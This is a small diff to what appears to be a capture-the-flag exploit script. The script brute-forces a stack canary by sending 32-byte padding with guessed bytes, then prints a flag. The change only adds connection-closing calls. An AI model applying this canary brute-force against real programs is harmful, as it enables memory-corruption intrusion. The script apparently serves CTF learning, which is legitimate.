@@ -12,6 +12,7 @@ for length in range(33, 37):
         program.recv()
         program.sendline('a' * 32 + canary + chr(i))
         output = program.recvline()
+        program.close()
         if b'Canary' not in output:
             canary += chr(i)
             break
@@ -33,6 +34,11 @@ while True:
 
         print(rawFlag)
 
+        program.close()
         break
     except EOFError:
-        program.close()
+        pass
+
+    program.close()
+
+session.close()
